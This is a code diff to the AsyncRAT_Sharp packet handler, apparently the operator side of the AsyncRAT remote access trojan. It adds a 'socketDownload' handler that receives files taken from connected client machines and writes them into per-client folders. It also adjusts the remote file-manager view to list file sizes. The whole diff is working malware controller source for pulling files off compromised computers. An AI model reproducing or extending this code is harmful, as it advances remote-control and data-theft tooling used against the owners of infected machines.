@@ -140,6 +140,58 @@ namespace AsyncRAT_Sharp.Handle_Packet
                         }
                         break;
 
+
+                    case "socketDownload":
+                        {
+                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
+                            {
+                                case "pre":
+                                    {
+                                        if (Program.form1.InvokeRequired)
+                                        {
+                                            Program.form1.BeginInvoke((MethodInvoker)(() =>
+                                            {
+
+                                                string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
+                                                string file = unpack_msgpack.ForcePathObject("File").AsString;
+                                                string size = unpack_msgpack.ForcePathObject("Size").AsString;
+                                                DownloadFile SD = (DownloadFile)Application.OpenForms["socketDownload:" + dwid];
+                                                if (SD != null)
+                                                {
+                                                    SD.C = Client;
+                                                    SD.labelfile.Text = Path.GetFileName(file);
+                                                    SD.Size = Convert.ToInt64(size);
+                                                    SD.timer1.Start();
+                                                }
+                                            }));
+                                        }
+                                    }
+                                    break;
+
+                                case "save":
+                                    {
+                                        if (Program.form1.InvokeRequired)
+                                        {
+                                            Program.form1.BeginInvoke((MethodInvoker)(() =>
+                                            {
+                                                string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
+                                                DownloadFile SD = (DownloadFile)Application.OpenForms["socketDownload:" + dwid];
+                                                if (SD != null)
+                                                {
+                                                    if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", ""))))
+                                                        Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "")));
+
+                                                    unpack_msgpack.ForcePathObject("File").SaveBytesToFile(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString));
+                                                }
+                                            }));
+                                        }
+                                    }
+                                    break;
+                            }
+                            break;
+                        }
+
+
                     case "fileManager":
                         {
                             switch (unpack_msgpack.ForcePathObject("Command").AsString)
@@ -216,16 +268,16 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                                         {
                                                             ListViewItem lv = new ListViewItem();
                                                             lv.Text = Path.GetFileName(_file[i]);
-                                                            lv.SubItems.Add(_file[i + 1]);
-                                                            lv.ToolTipText = _file[i];
+                                                            lv.ToolTipText = _file[i + 1];
                                                             Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_file[i + 2])));
                                                             FM.imageList1.Images.Add(_file[i + 1], im);
                                                             lv.ImageKey = _file[i + 1];
                                                             lv.Group = groupFile;
+                                                            lv.SubItems.Add(Methods.BytesToString(Convert.ToInt64(_file[i + 3])));
                                                             FM.listView1.Items.Add(lv);
                                                             numFiles += 1;
                                                         }
-                                                        i += 2;
+                                                        i += 3;
                                                     }
                                                     FM.toolStripStatusLabel2.Text = $"       Folder[{numFolders.ToString()}]   Files[{numFiles.ToString()}]";
                                                 }
